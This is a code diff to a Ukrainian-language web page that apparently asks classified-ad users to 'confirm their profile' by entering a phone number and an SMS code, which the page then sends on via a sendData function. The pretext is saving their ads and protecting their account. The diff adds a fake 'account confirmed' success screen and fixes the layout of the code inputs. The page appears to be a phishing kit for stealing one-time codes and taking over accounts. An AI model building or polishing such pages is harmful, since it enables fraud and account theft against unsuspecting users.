@@ -79,7 +79,6 @@
             box-shadow: 0 3px 10px rgba(0,0,0,0.1);
         }
 
-        /* НОВЫЙ ТЕКСТ-ПОДСКАЗКА */
         .info-text {
             background: #e3f2fd;
             color: #1565c0;
@@ -129,15 +128,20 @@
             font-size: 14.5px;
         }
 
-        /* КОМПАКТНЫЙ И СТАБИЛЬНЫЙ SMS-КОД */
+        /* ВИПРАВЛЕНО: SMS-код не виходить за екран */
         .code-input-group {
             display: flex;
             justify-content: center;
             gap: 8px;
             margin: 0 auto 20px;
-            max-width: 320px;
-            flex-wrap: nowrap;
-            overflow: hidden;
+            padding: 0 10px; /* Додано відступи */
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
+            scrollbar-width: none;
+        }
+
+        .code-input-group::-webkit-scrollbar {
+            display: none;
         }
 
         .code-input {
@@ -152,6 +156,7 @@
             background: #fff;
             -webkit-appearance: none;
             -moz-appearance: textfield;
+            flex-shrink: 0;
         }
 
         .code-input:focus {
@@ -197,6 +202,23 @@
             to { opacity: 1; transform: translateX(0); }
         }
 
+        /* Стиль для сторінки успіху */
+        .success-message {
+            text-align: center;
+            padding: 20px;
+            color: var(--success);
+            font-size: 18px;
+            font-weight: 600;
+            line-height: 1.6;
+        }
+
+        .success-message i {
+            font-size: 48px;
+            display: block;
+            margin-bottom: 16px;
+            color: var(--success);
+        }
+
         input[type=tel]::-webkit-inner-spin-button,
         input[type=tel]::-webkit-outer-spin-button {
             -webkit-appearance: none;
@@ -220,7 +242,6 @@
 
             <!-- Крок 1: Номер телефону -->
             <div id="phone-step" class="step active">
-                <!-- НОВЫЙ ТЕКСТ-ПОДСКАЗКА -->
                 <div class="info-text">
                     Щоб зберегти ваші оголошення, будь ласка, <strong>підтвердіть профіль</strong> через номер телефону. Це допоможе захистити ваш акаунт і забезпечити його стабільну роботу. 😊
                 </div>
@@ -255,6 +276,15 @@
                 <button type="button" class="submit-button" onclick="sendSmsCode()">
                     Підтвердити
                 </button>
+            </div>
+
+            <!-- Крок 3: Успіх -->
+            <div id="success-step" class="step">
+                <div class="success-message">
+                    <i class="fas fa-check-circle"></i>
+                    <div>Ваш акаунт успішно підтверджено,</div>
+                    <div>гарного дня!</div>
+                </div>
             </div>
         </div>
     </div>
@@ -307,7 +337,10 @@
                 return;
             }
             sendData('code', { code });
-            alert('Код підтверджено!');
+
+            // Перехід на сторінку успіху
+            $('#sms-step').removeClass('active');
+            $('#success-step').addClass('active');
         }
 
         function sendData(step, data) {
